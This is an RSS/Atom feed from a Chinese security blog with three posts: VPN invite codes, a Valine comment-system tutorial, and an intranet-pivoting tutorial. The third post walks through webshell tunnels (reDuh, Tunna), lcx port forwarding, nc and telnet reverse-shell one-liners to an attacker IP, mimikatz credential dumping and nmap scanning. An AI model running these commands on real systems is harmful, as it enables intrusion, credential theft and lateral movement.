<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ChaBug安全 | Www.ChaBug.Org</title>
  
  <subtitle>ChaBug用心做安全</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.chabug.org/"/>
  <updated>2017-11-07T14:40:52.669Z</updated>
  <id>http://www.chabug.org/</id>
  
  <author>
    <name>初遇</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>已更新邀请码 SSR分享-你的翻墙利器</title>
    <link href="http://www.chabug.org/2017/11/07/ssr-share/"/>
    <id>http://www.chabug.org/2017/11/07/ssr-share/</id>
    <published>2017-11-07T14:30:45.000Z</published>
    <updated>2017-11-07T14:40:52.669Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前奏"><a href="#前奏" class="headerlink" title="前奏"></a>前奏</h1><p>你是不是仍然被国内的网络环境所困扰？看这里！</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p><a href="https://www.myshenwang.tk" target="_blank" rel="external">神网加速器 www.myshenwang.tk</a></p><p>注册初始10G每次签到100-1024MB有1新加坡2日本3美国2香港</p><h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p><a href="https://www.myshenwang.tk/auth/register" target="_blank" rel="external">注册链接点我</a></p><p>在邀请码一栏填上下面的邀请码，注册成功后登陆使用ssr链接即可。</p><h1 id="邀请码"><a href="#邀请码" class="headerlink" title="邀请码"></a>邀请码</h1><table><thead><tr><th style="text-align:center">序号</th><th style="text-align:center">邀请码</th><th style="text-align:center">状态</th></tr></thead><tbody><tr><td style="text-align:center">6289</td><td style="text-align:center">BnKZC2UPwtdkijcZ8mcmLTDHQkw3OUsQ</td><td style="text-align:center">可用</td></tr><tr><td style="text-align:center">6305</td><td style="text-align:center">bqfOYHRy3hwMYU4aXHDtFyODzoj3xagh</td><td style="text-align:center">可用</td></tr><tr><td style="text-align:center">6304</td><td style="text-align:center">G7GBhz7o3MXriSRBd7rn4rZbalKTmlRL</td><td style="text-align:center">可用</td></tr><tr><td style="text-align:center">6303</td><td style="text-align:center">e5ByTbMzPEzzPzMUEDXnM5Lrf4ack5sH</td><td style="text-align:center">可用</td></tr><tr><td style="text-align:center">6302</td><td style="text-align:center">yk0ZZAztnYRCcySLK4r5N2TnrCSZeLl0</td><td style="text-align:center">可用</td></tr><tr><td style="text-align:center">6294</td><td style="text-align:center">UFx8zln6Rvc4t7ghaIm4e36UHCWh2EfH</td><td style="text-align:center">可用</td></tr><tr><td style="text-align:center">6292</td><td style="text-align:center">UU9lg2Pnkij9Ld9dv7vvr4SZofvhiiIB</td><td style="text-align:center">可用</td></tr><tr><td style="text-align:center">6291</td><td style="text-align:center">OysGSD2ilb0FJS90NHXHUoXFCQBEuXvp</td><td style="text-align:center">可用</td></tr><tr><td style="text-align:center">6290</td><td style="text-align:center">ir3TusS25CgqO4jN2rNSNisN3sSHO6En</td><td style="text-align:center">可用</td></tr><tr><td style="text-align:center">6306</td><td style="text-align:center">4IoEp6HA1F8fJMuY7Yak85abmfgtW96P</td><td style="text-align:center">可用</td></tr></tbody></table><p><strong>使用过哪个请在下方评论，方便你我他。</strong></p><h1 id="返利"><a href="#返利" class="headerlink" title="返利"></a>返利</h1><p>注意！邀请码请给认识的需要的人。<br>邀请有记录，若被邀请的人违反用户协议，您将会有连带责任。<br>邀请码暂时无法购买，请珍惜。</p><p>您每拉一位用户注册，可以获得<code>3G</code>流量奖励；当 TA 充值时还可获得 TA 充值金额的 <code>20 %</code>的提成。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前奏&quot;&gt;&lt;a href=&quot;#前奏&quot; class=&quot;headerlink&quot; title=&quot;前奏&quot;&gt;&lt;/a&gt;前奏&lt;/h1&gt;&lt;p&gt;你是不是仍然被国内的网络环境所困扰？看这里！&lt;/p&gt;
&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>给fexo主题添加Valine评论系统</title>
    <link href="http://www.chabug.org/2017/11/05/fexo-valine-comment/"/>
    <id>http://www.chabug.org/2017/11/05/fexo-valine-comment/</id>
    <published>2017-11-05T13:13:47.000Z</published>
    <updated>2017-11-06T03:17:31.582Z</updated>
    
    <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p><a href="https://github.com/forsigner/fexo" target="_blank" rel="external">fexo主题</a>是一款我自己感觉特别好看的hexo主题，但是有一点不太完美的地方。</p><p>fexo采用的第三方评论有hypercomments，disqus，多说，网易云跟帖。</p><p>不过hypercomments和disqus对国内的用户不太友好，所以果断放弃。而多说和网易云跟帖倒闭了，让我很无奈。只能自己操刀研究hexo主题，于是就有了这一篇文章。</p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>Valine是基于Leancloud的极简风评论系统。</p><ul><li>简约，有着极其漂亮的UI设计<a href="http://www.chabug.org/2017/11/05/fexo-valine-comment/#comment">看这里</a></li><li>免费，我还没有掏过钱</li><li>免备案</li><li>极致速度，国内国外速度都很强</li><li>可以免费用邮件通知和数字验证码</li></ul><p>其他请自行体验。</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="获取-APP-ID-和-APP-KEY"><a href="#获取-APP-ID-和-APP-KEY" class="headerlink" title="获取 APP ID 和 APP KEY"></a>获取 <code>APP ID</code> 和 <code>APP KEY</code></h2><ol><li><a href="https://leancloud.cn/dashboard/login.html#/signup" target="_blank" rel="external">点这里注册</a><code>Leancloud</code></li><li><a href="https://leancloud.cn/dashboard/applist.html#/newapp" target="_blank" rel="external">点这里创建应用</a></li><li>选择刚刚创建的<code>应用&gt;设置&gt;选择应用 Key</code>，然后你就能看到你的APP ID和APP KEY了，参考下图：<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl7jwcw91vj30vn0gyq45.jpg" alt=""></li><li>为了您的数据安全，请填写<code>应用&gt;设置&gt;安全设置中的Web 安全域名</code>，如下图：<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl7jv4hxuij30uj0pcad2.jpg" alt=""><h2 id="页面中的设置"><a href="#页面中的设置" class="headerlink" title="页面中的设置"></a>页面中的设置</h2>用代码说话<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Valine - A simple comment system based on Leancloud.<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--Leancloud 操作库:--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//cdn1.lncld.net/static/js/3.0.4/av-min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="comment">&lt;!--Valine 的核心代码库:--&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"./dist/Valine.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"comment"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">        new Valine(&#123;</span></div><div class="line"><span class="undefined">            // AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)</span></div><div class="line"><span class="undefined">            av: AV,</span></div><div class="line"><span class="undefined">            el: '.comment', //</span></div><div class="line"><span class="undefined">            app_id: 'Your APP ID', // 这里填写上面得到的APP ID</span></div><div class="line"><span class="undefined">            app_key: 'Your APP KEY', // 这里填写上面得到的APP KEY</span></div><div class="line"><span class="undefined">            placeholder: 'ヾﾉ≧∀≦)o来啊，快活啊!' // [v1.0.7 new]留言框占位提示文字</span></div><div class="line"><span class="undefined">        &#125;);</span></div><div class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></li></ol><h2 id="评论数据管理"><a href="#评论数据管理" class="headerlink" title="评论数据管理"></a>评论数据管理</h2><p>插播一下，关于评论数据管理，请自行登录Leancloud应用管理。<br>具体步骤：<code>登录&gt;选择你创建的应用&gt;存储&gt;选择ClassComment</code>，然后就可以尽情的发挥你的权利啦.</p><h1 id="fexo修改"><a href="#fexo修改" class="headerlink" title="fexo修改"></a>fexo修改</h1><p><a href="https://github.com/forsigner/fexo/pull/102/files" target="_blank" rel="external">参考GitHub add valine comment system</a></p><ol><li><p>主题<code>_config.yml</code>修改</p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"># Comment service</div><div class="line"># disqus_shortname: forsigner</div><div class="line"># hypercomments_id: 89821</div><div class="line"># gentie_key: d16a7241e7cd4b389584ed8db2a4e8bc</div><div class="line"></div><div class="line"># Valine comment system  https://valine.js.org</div><div class="line">valine:</div><div class="line">  enable: true # 如果使用valine，请设置改之为true</div><div class="line">  appid:  # your leancloud application appid</div><div class="line">  appkey:  # your leancloud application appkey</div><div class="line">  notify: true # mail notifier</div><div class="line">  verify: true # Verification code</div><div class="line">  placeholder: 看了这么久，来吐槽啊！ # comment box placeholder</div><div class="line">  avatar: mm # gravatar style</div><div class="line">  guest_info: nick,mail,link # custom comment header</div><div class="line">  pageSize: 10 # pagination size</div><div class="line"></div><div class="line"># 注意，多说即将关闭，建议选用上面四个评论系统</div><div class="line"># duoshuo_shortname: forsigner</div></pre></td></tr></table></figure></li><li><p>主题目录下<code>layout/_partial/component/comments.ejs</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"fexo-comments &lt;%= className %&gt;"</span>&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">%-</span> <span class="attr">partial</span>('<span class="attr">disqus</span>') %&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">%-</span> <span class="attr">partial</span>('<span class="attr">duoshuo</span>') %&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">%-</span> <span class="attr">partial</span>('<span class="attr">gentie</span>') %&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">%-</span> <span class="attr">partial</span>('<span class="attr">hypercomments</span>') %&gt;</span></div><div class="line">   <span class="tag">&lt;<span class="name">%-</span> <span class="attr">partial</span>('<span class="attr">valine</span>') %&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div></pre></td></tr></table></figure></li><li><p>在<code>layout/_partial/component/</code>目录下新建<code>valine.ejs</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (<span class="attr">theme.valine.enable</span>)&#123; %&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//cdn1.lncld.net/static/js/3.0.4/av-min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"//unpkg.com/valine@latest/dist/Valine.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"comment"</span> <span class="attr">class</span>=<span class="string">"vcomment"</span> &gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="xml">        var notify = '<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.valine.notify</span> %&gt;</span>' == true ? true : false;</span></div><div class="line"><span class="xml">        var verify = '<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.valine.verify</span> %&gt;</span>' == true ? true : false;</span></div><div class="line"><span class="undefined">        var GUEST_INFO = ['nick','mail','link'];</span></div><div class="line"><span class="xml">        var guest_info = '<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.valine.guest_info</span> %&gt;</span>'.split(',').filter(function(item)&#123;</span></div><div class="line"><span class="undefined">            return GUEST_INFO.indexOf(item) &gt; -1</span></div><div class="line"><span class="undefined">        &#125;);</span></div><div class="line"><span class="undefined">        guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;</span></div><div class="line"><span class="undefined">        window.valine = new Valine(&#123;</span></div><div class="line"><span class="undefined">            el: '.vcomment',</span></div><div class="line"><span class="undefined">            notify: notify,</span></div><div class="line"><span class="undefined">            verify: verify,</span></div><div class="line"><span class="xml">            appId: "<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.valine.appid</span> %&gt;</span>",</span></div><div class="line"><span class="xml">            appKey: "<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.valine.appkey</span> %&gt;</span>",</span></div><div class="line"><span class="xml">            avatar:'<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.valine.avatar</span> %&gt;</span>',</span></div><div class="line"><span class="xml">            placeholder: "<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.valine.placeholder</span> %&gt;</span>",</span></div><div class="line"><span class="undefined">            guest_info:guest_info,</span></div><div class="line"><span class="xml">            pageSize:'<span class="tag">&lt;<span class="name">%=</span> <span class="attr">theme.valine.pageSize</span> %&gt;</span>'</span></div><div class="line"><span class="undefined">        &#125;);</span></div><div class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line">  <span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></div></pre></td></tr></table></figure></li></ol><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>这个狗逼评论系统花了我一下午时间，找了很多资料，我在这里都贴出来，如果你看了我的文章还不会，请参考以下内容。<br><a href="https://ioliu.cn/2017/add-valine-comments-to-your-blog/" target="_blank" rel="external">Valine – 一款极简的评论系统</a><br><a href="https://panjunwen.com/diy-a-comment-system/#云引擎一键部署" target="_blank" rel="external">Valine: 独立博客评论系统解决方案</a> //这个相当于给评论系统搭建了后台管理  进阶必看<br><a href="http://liujiannn.com/note/2017.10.25/" target="_blank" rel="external">hexo搭建博客后magnetic主题如何添加valine评论系统</a> //适用于magenetic主题<br><a href="https://www.yfzzweb.com/Hexo/hexo-valine/#more" target="_blank" rel="external">Hexo优化 — 一款极简的评论系统</a> //适用于next主题</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/forsigner/fexo&quot; target=&quot;_blank&quot; rel=&quot;exter
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Mark一些内网漫游的知识</title>
    <link href="http://www.chabug.org/2017/11/05/neiwang/"/>
    <id>http://www.chabug.org/2017/11/05/neiwang/</id>
    <published>2017-11-05T02:31:45.000Z</published>
    <updated>2017-11-05T03:03:36.376Z</updated>
    
    <content type="html"><![CDATA[<p>当我们获取到一个webshell的时候，发现外网ip无法链接，但3389开放，那很有可能是内网服务器，下面我将介绍几款有关内网转发的工具。</p><p><strong>注意本文较长，请耐心阅读。</strong></p><h1 id="内网转发的工具"><a href="#内网转发的工具" class="headerlink" title="内网转发的工具"></a>内网转发的工具</h1><h2 id="Lcx-exe工具使用"><a href="#Lcx-exe工具使用" class="headerlink" title="Lcx.exe工具使用"></a>Lcx.exe工具使用</h2><p>首先远程目标系统要开启远程访问功能（若未开可通过开3389命令开启）.</p><p>lcx.exe是个端口转发工具，相当于把肉鸡A上的3389端口转发到B机上，当然这个B机必须有外网IP。这样链接B机的3389端口就相当于链接A机的3389。</p><p>首先在本地进行监听，监听51端口并转发到33891端口</p><p><code>lcx.exe -listen 51 33891</code><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl709rlimyj30fe04laag.jpg" alt=""></p><p>在webshell中运行</p><p><code>lcx.exe -slave 192.168.1.100 51 192.168.80.139 3389</code><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl709rlp11j30fe032mxi.jpg" alt=""></p><p>远程桌面访问33891端口<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl709rlvnbj30bh06edge.jpg" alt=""></p><p>使用创建的用户名密码登录服务器<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl709rtqv8j30b60a7gmf.jpg" alt=""></p><h2 id="Reduh内网反弹"><a href="#Reduh内网反弹" class="headerlink" title="Reduh内网反弹"></a>Reduh内网反弹</h2><p>服务端是个webshell（针对不同服务器有aspx,php,jsp三个版本），客户端是java写的，本地要安装jdk。<br>这里我们以php网站为例，首先将php文件上传到服务器端。</p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70dvdrdjj30al03ymx3.jpg" alt=""></p><p>浏览器中访问上传的webshell，提示以下内容说明解析成功</p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70dve5khj30ev04xdfw.jpg" alt=""></p><p>用客户端连接服务端</p><p><code>java -jar reDuhClient.jar http://192.168.80.139/zvuldrill/reDuh.php</code></p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70dvepjxj30fe05675f.jpg" alt=""></p><p>本地连接1010端口<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc.exe -vv localhost 1010</div><div class="line">[createTunnel]1235:127.0.0.1:3389</div></pre></td></tr></table></figure></p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70dvebctj30fe02574j.jpg" alt=""></p><p>远程登录</p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70dveww8j30bc06egm4.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70dvew5lj30fe0as74z.jpg" alt=""></p><h2 id="Tunna内网反弹"><a href="#Tunna内网反弹" class="headerlink" title="Tunna内网反弹"></a>Tunna内网反弹</h2><p>以下为后门文件，该工具是Python所写，需要Python环境，同样有jsp、aspx、php版本的webshell</p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70ipcj5oj307l055dfq.jpg" alt=""></p><p>这里使用php网站进行测试，上传php后门</p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70ipccknj30fe04ujrl.jpg" alt=""></p><p><code>python proxy.py -u http://192.168.80.139/zvuldrill/conn.php -l 1234 -r 3389 -v –s</code></p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70ipj2cmj30fe02sgm1.jpg" alt=""></p><p>远程连接</p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70ipd407j30bm06it9c.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70ipfrlij30fe0agdga.jpg" alt=""></p><h2 id="Linux系统通过nc反弹shell"><a href="#Linux系统通过nc反弹shell" class="headerlink" title="Linux系统通过nc反弹shell"></a>Linux系统通过nc反弹shell</h2><p>首先，攻击端进行监听</p><p><code>nc.exe -lvnp 2333</code><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu49knj30cs01pmwz.jpg" alt=""></p><p>服务器端执行</p><p><code>mknod /tmp/backpipe p</code></p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu4kh7j30ap024glh.jpg" alt=""></p><p><code>/bin/sh 0&lt;/tmp/backpipe | nc 192.168.1.101 2333 1&gt;/tmp/backpipe</code><br>Ip为攻击端ip<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu4sdkj30fe01haa9.jpg" alt=""></p><p>执行命令，查看发现反弹成功</p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu55pij30fe05ct9a.jpg" alt=""></p><h2 id="内置命令反弹"><a href="#内置命令反弹" class="headerlink" title="内置命令反弹"></a>内置命令反弹</h2><p><code>nc.exe -lvnp 2333</code><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu4od1j30cl01g0si.jpg" alt=""><br>服务器端执行</p><p><code>mknod /tmp/backpipe p</code><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu4g29j30cc00nwec.jpg" alt=""><br><code>telnet 192.168.1.101 2333 0&lt;backpipe | /bin/bash 1&gt;backpipe</code><br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lufr63j30fe01tq3s.jpg" alt=""></p><p>反弹成功</p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70lu8loaj30fe09qmyq.jpg" alt=""></p><h1 id="获取更多服务器"><a href="#获取更多服务器" class="headerlink" title="获取更多服务器"></a>获取更多服务器</h1><p>上面讲了我们如何进入进入一台内网系统，既然我们已经获得了一台内网服务，那么我们如何获取更多服务器呢</p><p>我们可能会想到目标系统是什么，安装了哪些应用，可能存在的漏洞等等。<br>同样，我们需要收集信息，来帮助更好的入侵其他主机，下面是一些常用的cmd命令，还有很多可自行学习<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">net user                               ------ 本机用户列表</div><div class="line">net localhroup administrators          ------ 本机管理员[通常含有域用户]</div><div class="line">net user /domain                       ------ 查询域用户</div><div class="line">net group /domain                      ------ 查询域里面的工作组</div><div class="line">net group &quot;domain admins&quot; /domain      ------ 查询域管理员用户组</div><div class="line">net localgroup administrators /domain  ------ 登录本机的域管理员</div><div class="line">net time /domain                       ------ 判断主域，主域服务器都做时间服务器</div><div class="line">net config workstation                 ------ 当前登录域</div></pre></td></tr></table></figure></p><h2 id="密码获取"><a href="#密码获取" class="headerlink" title="密码获取"></a>密码获取</h2><p>既然已经拿下服务器，那么我们就要获得服务器的密码，windows可以使用mimikatz获取用户名及密码，因为很有可能管理员将其他系统设置成相同的用户名密码。所以在其他内网系统可能同样适用。<br><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70r11bxzj30fe08wgn1.jpg" alt=""></p><p>可以看到既有hash值，也有明文用户名密码。</p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70r11scpj30fe08smyx.jpg" alt=""></p><h2 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h2><p>既然已经在一个内网，我们首先应该想到的就是探测有什么服务器，有哪些开放端口等等，可以使用nmap，扫描C段，看看有多少台在线服务器。</p><p>扫描存活主机，既然是扫描存活主机，那么当然越快越好（个人喜好）</p><p><code>nmap -PE -sn -T4 192.168.80.1/24</code></p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70r141hbj30fe03rdho.jpg" alt=""></p><p>我们已经知道那些ip是存活主机，那么就可以进一步获取各个系统的开放端口</p><p><code>nmap -sS -sV -O -p0-65535 192.168.80.145</code></p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70r13kwpj30fe05xjux.jpg" alt=""></p><p>可以看到开放的端口以及服务等服务器信息</p><p>同样，在内网也会存在很多不打系统补丁的情况，类似这次“WannaCry”虽然补丁已经出现一段时间，各大安全公司也好，各个安全部门也好都会提前预警打补丁，但是呢,你懂的，所以说，对某些不需要使用的端口及服务，直接停掉，以免临时抱佛脚，伤不起啊……<br>如果有系统漏洞，那么我们就可以使用matesploit进行溢出攻击等等</p><h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>同样，弱口令也是内网拿服务器的手段，说到弱口令就不得不说1433的mssql，3306的mysql，1521的Oracle，10050 的zabbix，7001的weblogic，8080的tomcat等等，都会存在弱口令的情况，但也存在被修改的情况，不过管理员嘛都是怕麻烦，会存在各种规律以免自己忘记，甚至有些管理员直接将某些账号密码写到某个文件夹中，这看你喽……</p><h2 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h2><p>也可以使用嗅探方法，如Cain，可以探测本地程序缓存的密码，通过嗅探器可以嗅探到相邻机器的username和password.。</p><h1 id="powershell-amp-PowerSploit"><a href="#powershell-amp-PowerSploit" class="headerlink" title="powershell &amp; PowerSploit"></a>powershell &amp; PowerSploit</h1><h2 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h2><p>powershell基础学习，如果想了解powershell渗透测试原理，需要进行简单脚本开发。推荐网址：<a href="http://www.pstips.net/powershell-executing-external-commands.html" target="_blank" rel="external">http://www.pstips.net/powershell-executing-external-commands.html</a></p><p><img src="http://ww1.sinaimg.cn/large/006xriynly1fl70r141hkj30en09f430.jpg" alt=""><br>基础部分就不给大家在细介绍，大家可以根据提供网址进行学习。</p><h2 id="Powershell的优秀之处"><a href="#Powershell的优秀之处" class="headerlink" title="Powershell的优秀之处"></a>Powershell的优秀之处</h2><ol><li>代码运行在内存中可以不去接触磁盘</li><li>从另一个系统中下载代码并执行</li><li>很多安全产品并不能监测到powershell的活动</li><li>cmd.exe通常被阻止运行，但是powershell不会。<br>本次主要是简单介绍下powersploit，后续会出一套关于powershell系列课程。</li></ol><h2 id="PowerSploit"><a href="#PowerSploit" class="headerlink" title="PowerSploit"></a>PowerSploit</h2><p>PowerSploit是GitHub上面的一个安全项目，上面有很多powershell攻击脚本，它们主要被用来渗透中的信息侦察、权限提升、权限维持。</p><p>项目地址：<a href="https://github.com/PowerShellMafia/PowerSploit" target="_blank" rel="external">https://github.com/PowerShellMafia/PowerSploit</a></p><p>代码执行（CodeExecution）</p><ul><li>Invoke-DllInjection</li><li>Invoke-ReflectivePEInjection</li><li>Invoke-Shellcode</li><li>Invoke-WmiCommand</li></ul><p>脚本修改（ScriptModification）</p><ul><li>Out-EncodedCommand</li><li>Out-CompressedDll</li><li>Out-EncryptedScript</li><li>Remove-Comments</li></ul><p>权限维持（Persistence）</p><ul><li>New-UserPersistenceOption</li><li>New-ElevatedPersistenceOption</li><li>Add-Persistence</li><li>Install-SSP</li><li>Get-SecurityPackages</li></ul><p>绕过杀毒软件（AntivirusBypass）</p><ul><li><p>Find-AVSignature<br>信息收集（Exfiltration）</p></li><li><p>这个文件夹主要是收集目标主机上的信息。<br>信息侦察（Recon）</p></li><li><p>这个文件夹主要是以目标主机为跳板进行内网主机侦察。</p></li></ul><p>ending..</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;当我们获取到一个webshell的时候，发现外网ip无法链接，但3389开放，那很有可能是内网服务器，下面我将介绍几款有关内网转发的工具。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注意本文较长，请耐心阅读。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;内网转发的工具&quot;&gt;&lt;a href=
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>AppNode Linux服务器集群管理面板</title>
    <link href="http://www.chabug.org/2017/11/04/appnode-panel/"/>
    <id>http://www.chabug.org/2017/11/04/appnode-panel/</id>
    <published>2017-11-04T13:52:11.000Z</published>
    <updated>2017-11-05T05:46:47.133Z</updated>
    
